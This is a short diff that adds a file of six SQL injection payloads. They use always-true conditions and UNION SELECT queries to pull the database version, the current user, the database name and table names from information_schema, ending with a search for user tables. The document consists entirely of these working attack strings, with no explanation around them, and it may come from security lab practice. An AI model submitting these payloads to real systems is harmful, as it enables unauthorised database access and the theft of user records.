@@ -1,0 +1,6 @@
+%' or '0'='0
+%' or 0=0 union select null, version() #
+%' or 0=0 union select null, user() #
+%' or 0=0 union select null, database() #
+%' and 1=0 union select null, table_name from information_schema.tables #
+%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
